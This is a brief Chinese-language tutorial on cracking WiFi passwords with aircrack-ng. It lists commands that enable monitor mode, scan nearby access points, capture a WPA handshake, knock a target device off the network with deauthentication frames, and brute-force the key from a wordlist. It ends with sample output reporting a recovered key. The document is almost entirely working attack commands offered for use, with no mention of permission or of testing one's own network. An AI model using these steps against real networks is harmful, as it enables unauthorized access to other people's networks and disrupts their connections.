# 破解 WIFI

>   破解成功与否取决于字典文件覆盖率，一般只能破解纯数字或纯字母

- 执行`sudo apt-get install aircrack-ng`安装`aircrack-ng`
- 执行`ifconfig`查看网卡信息，得到无线网卡接口为`wlp61s0`
- 执行`sudo airmon-ng`列出支持监控的无线网卡

``` log
PHY	Interface	Driver		Chipset

phy0	wlp61s0		iwlwifi		Intel Corporation Wireless-AC 9260 (rev 29)
```

- 执行 `sudo airmon-ng start wlp61s0` 开启监控模式，成功后网卡接口变为 `wlp61s0mon`
- 执行 `sudo airodump-ng wlp61s0mon` 查看网络信息，可以得到附近的Wifi热点列表
- 执行 `sudo airodump-ng -c 6 --bssid <路由器网关> -w <目录+抓包记录文件名前缀> wlp61s0mon` 开始发送握手包
- 执行 `sudo aireplay-ng -0 2 -a <路由器网关> -c <目标设备分配网关> wlp61s0mon`
- 执行 `sudo aircrack-ng -w <字典文件(.txt)> -b <路由器网关> <抓包记录(.cap)>`
- 执行 `sudo airmon-ng stop wlp61s0mon`可以退出监控模式
- 破解成功效果如下：

```log
                               Aircrack-ng 1.6 

      [00:00:01] 15441/539314 keys tested (20206.41 k/s) 

      Time left: 25 seconds                                      2.86%

                           KEY FOUND! [ 19920224 ]


      Master Key     : B2 7F DA 0D B3 8E A7 08 84 11 59 C8 55 58 84 52 
                       AD ED BD A1 2C 92 E3 5D 96 75 7A 7C 14 73 13 7B 

      Transient Key  : 39 59 FD 98 08 65 DC 8D 27 1C 73 AE E3 3E 7E 41 
                       31 AA BF AD 2A 3F 4F 28 C6 80 4A 53 89 CC C8 5B 
                       0D A4 77 DC C6 07 66 C2 B3 C6 D1 F8 64 30 EE F3 
                       9C ED FC 6D DF 4D 9E 70 15 27 CF C0 ED 5A 97 F6 

      EAPOL HMAC     : 60 95 69 8E 2C 93 BE CD 33 64 5E C7 65 5B AC 31
```